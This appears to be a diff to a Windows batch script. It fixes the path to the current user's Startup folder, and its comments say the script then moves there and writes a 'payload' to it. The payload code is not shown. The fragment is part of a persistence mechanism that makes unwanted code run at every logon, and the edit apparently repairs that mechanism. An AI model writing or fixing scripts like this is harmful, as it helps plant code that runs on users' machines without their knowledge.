@@ -5,7 +5,7 @@
 
 @REM variables
 set "initialPath=%cd%"
-set "STARTUP=%C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/startup%"
+set "STARTUP=C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
 @REM move into startup directory
 cd %STARTUP%
 @REM writeS payload to startup
